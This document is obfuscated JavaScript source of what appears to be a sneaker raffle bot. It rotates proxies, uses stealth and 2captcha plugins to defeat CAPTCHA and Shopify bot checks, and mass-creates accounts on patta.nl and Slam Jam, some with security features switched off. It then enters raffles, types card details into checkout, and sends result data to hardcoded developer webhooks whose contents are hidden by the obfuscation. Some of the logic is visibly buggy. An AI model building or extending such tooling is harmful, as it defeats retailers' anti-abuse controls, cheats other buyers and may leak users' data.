        _0x992352(_0x2bab09['name'] + '\x20Task\x20' + (_0xe2b5c9 + 0x1) + '\x20/\x20' + _0xeb45d1['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa), await _0x3e6cb2(_0xeb45d1, _0xe2b5c9);
        var _0x1ece34 = await _0x3553d9(_0xeb45d1[_0xe2b5c9], _0x2bab09, 'acc', ![]);
        const _0x3942c4 = { 'succesDEVMSG': { 'embeds': [_0x1ece34] } };
        if (_0xeb45d1[_0xe2b5c9]['Email'] == '' || _0xeb45d1[_0xe2b5c9]['FirstName'] == '' || _0xeb45d1[_0xe2b5c9]['LastName'] == '') {
            console['log'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0xe2b5c9 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x73378f(0x7d0);
            continue;
        }
        (_0xeb45d1[_0xe2b5c9]['Password'] == '' || _0xeb45d1[_0xe2b5c9] == undefined) && _0xeb45d1[_0xe2b5c9]['Password'] == 'JRaffles23!';
        if (_0x5690b2['useRandomProxy'] = ![])
            var _0x5a4f77 = _0x9470c5[_0xe2b5c9]['split'](':');
        else
            var _0x484e5a = Math['round'](Math['random']() * (_0x9470c5['length'] - 0x1)), _0x5a4f77 = _0x9470c5[_0x484e5a]['split'](':');
        const _0x426468 = await _0x4baac5['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x5a4f77[0x0] + ':' + _0x5a4f77[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x3d3598 = await _0x426468['newPage']();
            await _0x3d3598['authenticate']({
                'username': '' + _0x5a4f77[0x2],
                'password': '' + _0x5a4f77[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x2bab09['name'] + ']\x20Task\x20' + (_0xe2b5c9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3d3598['setRequestInterception'](!![]), _0x3d3598['on']('request', _0x3bb202 => {
                _0x3bb202['resourceType']() === 'image' || _0x3bb202['resourceType']() === 'font' || _0x3bb202['resourceType']() === 'media' ? _0x3bb202['abort']() : _0x3bb202['continue']();
            }), await _0x3d3598['goto'](_0x44a2f5), await _0x73378f(0xbb8), await _0x3d3598['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x18cf54() + '\x20[' + _0x2bab09['name'] + ']\x20Task\x20' + (_0xe2b5c9 + 0x1) + '\x20:\x20Filling\x20information'), await _0x3d3598['type']('#RegisterForm-FirstName', '' + _0xeb45d1[_0xe2b5c9]['FirstName']), await _0x73378f(0x226), await _0x3d3598['type']('#RegisterForm-LastName', '' + _0xeb45d1[_0xe2b5c9]['LastName']), await _0x73378f(0x226), await _0x3d3598['type']('#RegisterForm-email', '' + _0xeb45d1[_0xe2b5c9]['Email']), await _0x73378f(0x226), await _0x3d3598['type']('#RegisterForm-password', '' + _0xeb45d1[_0xe2b5c9]['Password']), await _0x73378f(0x226), console['log'](_0x18cf54() + '\x20[' + _0x2bab09['name'] + ']\x20Task\x20' + (_0xe2b5c9 + 0x1) + '\x20:\x20Submitting..'), await _0x3d3598['$eval']('#RegisterForm', _0x2b997d => _0x2b997d['submit']()), await _0x73378f(0x1f40);
            try {
                await _0x3d3598['waitForSelector']('.home-page-grid__collection'), await _0x73378f(0x1f4), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x2bab09['name'] + ']\x20Task\x20' + (_0xe2b5c9 + 0x1) + '\x20:\x20Account\x20' + _0xeb45d1[_0xe2b5c9]['Email'] + '\x20Generated!')), _0x536860['appendFileSync']('../accounts/patta.csv', '\x0a' + _0xeb45d1[_0xe2b5c9]['Email'] + ',' + _0xeb45d1[_0xe2b5c9]['Password']), console['log'](_0x5ecce5['yellow'](_0x18cf54() + '\x20[' + _0x2bab09['name'] + ']\x20Task\x20' + (_0xe2b5c9 + 0x1) + '\x20:\x20Account\x20' + _0xeb45d1[_0xe2b5c9]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x3942c4['succesDEVMSG']);
                } catch {
                }
                await _0x278fc0(_0x10deb2, _0x3942c4['succesDEVMSG']);
            } catch (_0x7a1c15) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0xe2b5c9 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x7a1c15));
            }
        } catch (_0x4c32b5) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0xe2b5c9 + 0x1) + '\x20:\x20' + _0x4c32b5));
        } finally {
            _0x426468 && _0x426468['close'](), console['log']('Waiting\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
        }
    }
}
async function _0x45785c(_0x3a5004, _0x209b2b, _0x16deed, _0x1ee291) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x190bc5 = 0x0; _0x190bc5 < _0x16deed['length']; _0x190bc5++) {
        var _0x126943, _0x2402a9 = '', _0x3d1d4a = 0x0;
        _0x992352(_0x209b2b['name'] + '\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20/\x20' + _0x16deed['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa), await _0x3e6cb2(_0x16deed, _0x190bc5);
        if (_0x16deed[_0x190bc5]['Email'] == '' || _0x16deed[_0x190bc5]['Password'] == '' || _0x16deed[_0x190bc5]['FirstName'] == '' || _0x16deed[_0x190bc5]['LastName'] == '') {
            console['log'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5690b2['useRandomProxy'] = ![])
            var _0x1c709f = _0x1ee291[_0x190bc5]['split'](':');
        else
            var _0x31e900 = Math['round'](Math['random']() * (_0x1ee291['length'] - 0x1)), _0x1c709f = _0x1ee291[_0x31e900]['split'](':');
        const _0x1eab90 = await _0x4baac5['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x1c709f[0x0] + ':' + _0x1c709f[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x50f25f = await _0x1eab90['newPage']();
            await _0x50f25f['authenticate']({
                'username': '' + _0x1c709f[0x2],
                'password': '' + _0x1c709f[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x209b2b['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x50f25f['setRequestInterception'](!![]), _0x50f25f['on']('request', _0x51da9 => {
                _0x51da9['resourceType']() === 'image' || _0x51da9['resourceType']() === 'font' || _0x51da9['resourceType']() === 'media' ? _0x51da9['abort']() : _0x51da9['continue']();
            }), await _0x50f25f['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x50f25f['waitForSelector']('#CustomerEmail'), console['log'](_0x18cf54() + '\x20[' + _0x209b2b['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x50f25f['type']('#CustomerEmail', '' + _0x16deed[_0x190bc5]['Email']), await _0x73378f(0x12c), await _0x50f25f['type']('#CustomerPassword', '' + _0x16deed[_0x190bc5]['Password']), await _0x73378f(0x226), await _0x50f25f['$eval']('#customer_login', _0x3372b0 => _0x3372b0['submit']());
            try {
                await _0x50f25f['waitForSelector']('#orders'), await _0x73378f(0x4b0);
            } catch {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x209b2b['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x50f25f['goto']('' + _0x16deed[_0x190bc5]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x73378f(0xbb8), console['log'](_0x18cf54() + '\x20[' + _0x209b2b['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x50f25f['waitForSelector']('#email');
            } catch {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x209b2b['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x50f25f['type']('#email', '' + _0x16deed[_0x190bc5]['Email']), await _0x73378f(0x384), await _0x50f25f['type']('#first_name', '' + _0x16deed[_0x190bc5]['FirstName']), await _0x73378f(0x514), await _0x50f25f['type']('#last_name', '' + _0x16deed[_0x190bc5]['LastName']), await _0x73378f(0x514), await _0x50f25f['type']('#street_address', _0x16deed[_0x190bc5]['Address1'] + '\x20' + _0x16deed[_0x190bc5]['HouseNumber'] + '\x20' + _0x16deed[_0x190bc5]['Address2']), await _0x73378f(0x2bc);
            _0x16deed[_0x190bc5]['Postcode'] == undefined && (_0x16deed[_0x190bc5]['Postcode'] = _0x16deed[_0x190bc5]['Zip']);
            await _0x50f25f['type']('#zip_code', '' + _0x16deed[_0x190bc5]['Postcode']), await _0x73378f(0x320), await _0x50f25f['type']('#city', '' + _0x16deed[_0x190bc5]['City']), await _0x73378f(0x320), await _0x50f25f['type']('#bday', '01/01/1994'), await _0x73378f(0x320), await _0x50f25f['type']('#instagram', '' + _0x16deed[_0x190bc5]['Follower']), await _0x73378f(0x352);
            if (_0x16deed[_0x190bc5]['Size'] == 'RANDOM') {
                const _0x8ec1ce = await _0x50f25f['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x1f8194 => {
                    return _0x1f8194['map'](_0x3bbeb5 => _0x3bbeb5['textContent']);
                });
                var _0x23d43b = Math['round'](Math['random']() * (_0x8ec1ce['length'] - 0x1));
                console['log'](_0x18cf54() + '\x20[' + _0x209b2b['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x8ec1ce[_0x23d43b]), await _0x50f25f['click']('label[data-eu-size=\x22' + _0x8ec1ce[_0x23d43b] + '\x22]');
            } else {
                console['log'](_0x18cf54() + '\x20[' + _0x209b2b['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x16deed[_0x190bc5]['Size']);
                try {
                    await _0x50f25f['click']('label[data-eu-size=\x22' + _0x16deed[_0x190bc5]['Size'] + '\x22]');
                } catch {
                    await _0x50f25f['click']('label[data-eu-size=\x22' + _0x16deed[_0x190bc5]['Size'] + '.0\x22]');
                }
            }
            await _0x73378f(0xbb8), await _0x50f25f['$$eval']('.raffle__checkbox-label', _0xf87aae => _0xf87aae['forEach'](_0x62fb14 => _0x62fb14['click']())), await _0x73378f(0x7d0), console['log'](_0x18cf54() + '\x20[' + _0x209b2b['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x50f25f['click']('#raffle__form-submit'), await _0x73378f(0x1388);
            try {
                await _0x50f25f['waitForSelector']('#raffle__confirmation-message-container'), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x209b2b['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x47558f) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x47558f));
            }
        } catch (_0x38562b) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20' + _0x38562b)), _0x2402a9 = 'yes';
        } finally {
            _0x1eab90 && _0x1eab90['close']();
            if (_0x2402a9 == 'yes' && _0x3d1d4a != 0x5) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x209b2b['name'] + ']\x20Task\x20' + (_0x190bc5 + 0x1) + '\x20:\x20Retrying')), _0x190bc5 = _0x190bc5 - 0x1, _0x3d1d4a = _0x3d1d4a + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
        }
    }
}
async function _0x3d8232(_0x56b05a, _0x3274d4, _0xc13730, _0x4f6037) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x79b59e = 0x0; _0x79b59e < _0xc13730['length']; _0x79b59e++) {
        var _0x551cdb = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5746a9
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5690b2['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x2f0e91
                }
            ]
        }];
        const _0x1bc032 = { 'embeds': _0x551cdb };
        _0x992352(_0x3274d4['name'] + '\x20Task\x20' + (_0x79b59e + 0x1) + '\x20/\x20' + _0xc13730['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa), await _0x3e6cb2(_0xc13730, _0x79b59e);
        var _0x21cbaa = await _0x3553d9(_0xc13730[_0x79b59e], _0x3274d4, 'acc', ![]);
        const _0x4eae09 = { 'succesDEVMSG': { 'embeds': [_0x21cbaa] } };
        if (_0xc13730[_0x79b59e]['Email'] == '' || _0xc13730[_0x79b59e]['FirstName'] == '' || _0xc13730[_0x79b59e]['LastName'] == '') {
            console['log'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x79b59e + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x73378f(0x7d0);
            continue;
        }
        (_0xc13730[_0x79b59e]['Password'] == '' || _0xc13730[_0x79b59e] == undefined) && _0xc13730[_0x79b59e]['Password'] == 'JRaffles23!';
        if (_0x5690b2['useRandomProxy'] = ![])
            var _0x4e15e0 = _0x4f6037[_0x79b59e]['split'](':');
        else
            var _0x54069b = Math['round'](Math['random']() * (_0x4f6037['length'] - 0x1)), _0x4e15e0 = _0x4f6037[_0x54069b]['split'](':');
        const _0xe2d736 = await _0x4baac5['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4e15e0[0x0] + ':' + _0x4e15e0[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x3cd1f7 = await _0xe2d736['newPage']();
            await _0x3cd1f7['authenticate']({
                'username': '' + _0x4e15e0[0x2],
                'password': '' + _0x4e15e0[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x3274d4['name'] + ']\x20Task\x20' + (_0x79b59e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3cd1f7['setRequestInterception'](!![]), _0x3cd1f7['on']('request', _0x42a3e3 => {
                _0x42a3e3['resourceType']() === 'image' || _0x42a3e3['resourceType']() === 'font' || _0x42a3e3['resourceType']() === 'media' ? _0x42a3e3['abort']() : _0x42a3e3['continue']();
            }), await _0x3cd1f7['goto']('https://drop.slamjam.com/account/register'), await _0x73378f(0xbb8), await _0x3cd1f7['waitForSelector']('#FirstName'), await _0x3cd1f7['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x3cd1f7['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x18cf54() + '\x20[' + _0x3274d4['name'] + ']\x20Task\x20' + (_0x79b59e + 0x1) + '\x20:\x20Filling\x20information'), await _0x73378f(0x4b0), await _0x3cd1f7['type']('#FirstName', '' + _0xc13730[_0x79b59e]['FirstName']), await _0x73378f(0x226), await _0x3cd1f7['type']('#LastName', '' + _0xc13730[_0x79b59e]['LastName']), await _0x73378f(0x226), await _0x3cd1f7['type']('#Email', '' + _0xc13730[_0x79b59e]['Email']), await _0x73378f(0x2ee), await _0x3cd1f7['type']('#ConfirmEmail', '' + _0xc13730[_0x79b59e]['Email']), await _0x73378f(0x2ee), await _0x3cd1f7['type']('#CreatePassword', '' + _0xc13730[_0x79b59e]['Password']), await _0x73378f(0x2ee), await _0x3cd1f7['type']('#CreateConfirmPassword', '' + _0xc13730[_0x79b59e]['Password']), await _0x73378f(0x226), console['log'](_0x18cf54() + '\x20[' + _0x3274d4['name'] + ']\x20Task\x20' + (_0x79b59e + 0x1) + '\x20:\x20Submitting..'), await _0x3cd1f7['$eval']('#create_customer', _0x433f9d => _0x433f9d['submit']()), await _0x73378f(0x1388), console['log'](_0x18cf54() + '\x20[' + _0x3274d4['name'] + ']\x20Task\x20' + (_0x79b59e + 0x1) + '\x20:\x20' + _0x5ecce5['cyan']('Solving\x20Captcha')), await _0x3cd1f7['solveRecaptchas'](), console['log'](_0x18cf54() + '\x20[' + _0x3274d4['name'] + ']\x20Task\x20' + (_0x79b59e + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x3cd1f7['$eval']('.shopify-challenge__container\x20>\x20form', _0x319664 => _0x319664['submit']());
            try {
                await _0x3cd1f7['waitForSelector']('.product-card__image'), await _0x73378f(0x1f4), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x3274d4['name'] + ']\x20Task\x20' + (_0x79b59e + 0x1) + '\x20:\x20Account\x20' + _0xc13730[_0x79b59e]['Email'] + '\x20Generated!')), _0x536860['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0xc13730[_0x79b59e]['Email'] + ',' + _0xc13730[_0x79b59e]['Password']), console['log'](_0x5ecce5['yellow'](_0x18cf54() + '\x20[' + _0x3274d4['name'] + ']\x20Task\x20' + (_0x79b59e + 0x1) + '\x20:\x20Account\x20' + _0xc13730[_0x79b59e]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x4eae09['succesDEVMSG']);
                } catch {
                }
                await _0x278fc0(_0x10deb2, _0x4eae09['succesDEVMSG']);
            } catch (_0x5161ef) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x79b59e + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x5161ef));
            }
        } catch (_0xcd8ec4) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x79b59e + 0x1) + '\x20:\x20' + _0xcd8ec4));
        } finally {
            _0xe2d736 && _0xe2d736['close'](), console['log']('Waiting\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
        }
    }
}
async function _0x4c1e3c(_0x2525d5, _0x144124, _0x5e562f, _0xbbbcac) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2487cd = 0x0; _0x2487cd < _0x5e562f['length']; _0x2487cd++) {
        var _0x5efe91, _0x4b20c9 = '', _0x3aa948 = 0x0;
        _0x992352(_0x144124['name'] + '\x20Task\x20' + (_0x2487cd + 0x1) + '\x20/\x20' + _0x5e562f['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa), await _0x3e6cb2(_0x5e562f, _0x2487cd);
        if (_0x5e562f[_0x2487cd]['Email'] == '' || _0x5e562f[_0x2487cd]['Password'] == '' || _0x5e562f[_0x2487cd]['FirstName'] == '' || _0x5e562f[_0x2487cd]['LastName'] == '') {
            console['log'](_0x18cf54() + '\x20[' + _0x144124['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5690b2['useRandomProxy'] = ![])
            var _0x296795 = _0xbbbcac[_0x2487cd]['split'](':');
        else
            var _0x53c72c = Math['round'](Math['random']() * (_0xbbbcac['length'] - 0x1)), _0x296795 = _0xbbbcac[_0x53c72c]['split'](':');
        const _0x55e6a1 = await _0x4baac5['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x296795[0x0] + ':' + _0x296795[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x458d5b = await _0x55e6a1['newPage']();
            await _0x458d5b['authenticate']({
                'username': '' + _0x296795[0x2],
                'password': '' + _0x296795[0x3]
            }), await _0x458d5b['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x18cf54() + '\x20[' + _0x144124['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x458d5b['setRequestInterception'](!![]), _0x458d5b['on']('request', _0x1746af => {
                _0x1746af['resourceType']() === 'image' || _0x1746af['resourceType']() === 'font' || _0x1746af['resourceType']() === 'media' ? _0x1746af['abort']() : _0x1746af['continue']();
            }), await _0x458d5b['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x458d5b['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x458d5b['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x73378f(0x258), await _0x458d5b['waitForSelector']('#CustomerEmail'), console['log'](_0x18cf54() + '\x20[' + _0x144124['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20Logging\x20in..'), await _0x458d5b['type']('#CustomerEmail', '' + _0x5e562f[_0x2487cd]['Email']), await _0x73378f(0x12c), await _0x458d5b['type']('#CustomerPassword', '' + _0x5e562f[_0x2487cd]['Password']), await _0x73378f(0x226), await _0x458d5b['$eval']('#customer_login', _0x4271b7 => _0x4271b7['submit']()), await _0x73378f(0x7d0), await _0x458d5b['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x18cf54() + '\x20[' + _0x144124['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20' + _0x5ecce5['cyan']('Solving\x20Captcha')), await _0x458d5b['solveRecaptchas'](), console['log'](_0x18cf54() + '\x20[' + _0x144124['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x458d5b['$eval']('.shopify-challenge__container\x20>\x20form', _0x1c4f02 => _0x1c4f02['submit']());
            try {
                await _0x458d5b['waitForSelector']('.nav-account'), await _0x73378f(0x4b0);
            } catch {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x144124['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x458d5b['goto']('' + _0x5e562f[_0x2487cd]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x73378f(0xbb8), console['log'](_0x18cf54() + '\x20[' + _0x144124['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x458d5b['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
            await _0x458d5b['click']('.product-select-variant-wrapper'), await _0x73378f(0x320), await _0x458d5b['click']('li.product-select-variant__value[data-size=\x22' + _0x5e562f[_0x2487cd]['Size'] + '\x22]'), await _0x73378f(0x384), await _0x458d5b['$eval']('#AddToCartForm-product-template-raffle', _0x1dd66a => _0x1dd66a['submit']()), await _0x458d5b['waitForSelector']('.cart-order-summary__content'), await _0x73378f(0x514), await _0x458d5b['goto']('https://drop.slamjam.com/checkout'), await _0x73378f(0x514), await _0x458d5b['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x18cf54() + '\x20[' + _0x144124['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20Filling\x20Information'), await _0x458d5b['select']('#checkout_shipping_address_country', '' + _0x5e562f[_0x2487cd]['Country']), await _0x73378f(0x200), await _0x458d5b['waitForSelector']('#checkout_shipping_address_first_name'), await _0x458d5b['type']('#checkout_shipping_address_first_name', '' + _0x5e562f[_0x2487cd]['FirstName']), await _0x73378f(0x237), await _0x458d5b['type']('#checkout_shipping_address_last_name', '' + _0x5e562f[_0x2487cd]['LastName']), await _0x73378f(0x1e0), await _0x458d5b['type']('#checkout_shipping_address_address1', _0x5e562f[_0x2487cd]['Address1'] + '\x20' + _0x5e562f[_0x2487cd]['HouseNumber']), await _0x73378f(0x514), await _0x458d5b['type']('#checkout_shipping_address_address2', '' + _0x5e562f[_0x2487cd]['Address2']), await _0x73378f(0x514);
            _0x5e562f[_0x2487cd]['Postcode'] == undefined && (_0x5e562f[_0x2487cd]['Postcode'] = _0x5e562f[_0x2487cd]['Zip']);
            await _0x458d5b['type']('#checkout_shipping_address_zip', '' + _0x5e562f[_0x2487cd]['Postcode']), await _0x73378f(0x2bc), await _0x458d5b['type']('#checkout_shipping_address_city', '' + _0x5e562f[_0x2487cd]['City']), await _0x73378f(0x320), await _0x458d5b['type']('#checkout_shipping_address_phone', '' + _0x5e562f[_0x2487cd]['Phone']), await _0x73378f(0x320), await _0x458d5b['click']('#continue_button'), await _0x73378f(0xbb8), await _0x458d5b['waitForSelector']('.summary-title'), await _0x73378f(0x320), await _0x458d5b['click']('#continue_button'), await _0x73378f(0x320), console['log'](_0x18cf54() + '\x20[' + _0x144124['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x458d5b['waitForSelector']('#checkout_credit_card_vault'), await _0x73378f(0x3e8);
            var _0x5adf74 = await _0x458d5b['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x3ae87c = await _0x5adf74['contentFrame']();
            await _0x3ae87c['click']('#number'), await _0x73378f(0x3e8), await _0x3ae87c['type']('#number', '' + _0x5e562f[_0x2487cd]['CardNumber'], { 'delay': 0x78 }), _0x5adf74 = await _0x458d5b['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x3ae87c = await _0x5adf74['contentFrame'](), await _0x73378f(0x1c2), await _0x3ae87c['click']('#name'), await _0x73378f(0x1f4), await _0x3ae87c['type']('#name', '' + _0x5e562f[_0x2487cd]['NameOnCard'], { 'delay': 0x78 }), _0x5adf74 = await _0x458d5b['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x3ae87c = await _0x5adf74['contentFrame'](), await _0x73378f(0x1c2), await _0x3ae87c['click']('#expiry'), await _0x73378f(0x1f4), await _0x3ae87c['type']('#expiry', '' + _0x5e562f[_0x2487cd]['ExpiryDate'], { 'delay': 0x78 }), _0x5adf74 = await _0x458d5b['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x3ae87c = await _0x5adf74['contentFrame'](), await _0x73378f(0x1c2), await _0x3ae87c['click']('#verification_value'), await _0x73378f(0x1f4), await _0x3ae87c['type']('#verification_value', '' + _0x5e562f[_0x2487cd]['CVV'], { 'delay': 0x78 }), await _0x458d5b['$eval']('#accepts-flag-raffle', _0x41f5a9 => _0x41f5a9['click']()), await _0x73378f(0x7d0), console['log'](_0x18cf54() + '\x20[' + _0x144124['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20Processing\x20Order'), await _0x458d5b['$eval']('#continue_button', _0x336a71 => _0x336a71['click']()), await _0x73378f(0x1b58), await _0x458d5b['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x458d5b['$eval']('.edit_checkout.animate-floating-labels', _0x510790 => _0x510790['submit']()), await _0x73378f(0x7d0);
            try {
                await _0x458d5b['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x144124['name'] + ']\x20Task\x20' + (_0x2487cd + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x3a201e) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x3a201e['message']);
            }
            var _0x181b4f = await _0x3553d9(_0x5e562f[_0x2487cd], _0x144124, 'dev', ![]), _0xea0c94 = await _0x3553d9(_0x5e562f[_0x2487cd], _0x144124, 'pub', ![]);
            const _0x357d36 = {
                'succesDEVMSG': { 'embeds': [_0x181b4f] },
                'succesPUBMSG': { 'embeds': [_0xea0c94] }
            };
            try {
                _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x357d36['succesDEVMSG']), await _0x73378f(0xc8), await _0x278fc0(_0x4c279b, _0x357d36['succesDEVMSG']), await _0x73378f(0xc8), await _0x278fc0(_0x319480, _0x357d36['succesPUBMSG']);
            } catch (_0x460eeb) {
